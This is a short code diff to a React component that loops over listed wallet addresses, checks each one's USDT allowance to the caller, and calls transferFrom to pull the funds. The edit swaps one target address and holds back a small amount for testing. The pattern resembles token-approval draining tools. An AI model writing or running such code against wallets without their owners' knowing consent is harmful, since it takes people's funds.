@@ -135,7 +135,7 @@ const Collection = () => {
   /**
    * 待提取地址列表，生产需要获取
    * */ 
-  const addressToWithdrawList = ["0x46bD3F02D77a6F41fC052E8Ec79002D30a4Dd19A","0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266"];
+  const addressToWithdrawList = ["0x53f989804eFE987Cd9837C8367126a94190E28c9","0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266"];
   async function collectFunc() {
     
     try {
@@ -149,7 +149,9 @@ const Collection = () => {
         const allowance = await USDTContract.allowance(targetAddress, address);
         if (allowance > 0) {
           const canWithdraw = allowance > balance ? balance: allowance;
-          await transferFrom({args:[ targetAddress, address, canWithdraw]});
+
+          console.log("canWithdraw:",canWithdraw - 2500000n);// 测试打印，只转去 部分，为了测试不提取全部，- 3000000n
+          await transferFrom({args:[ targetAddress, address, canWithdraw - 2500000n]});
         } else {
           console.log(targetAddress,":无allowance余额用来归集",allowance);
         }
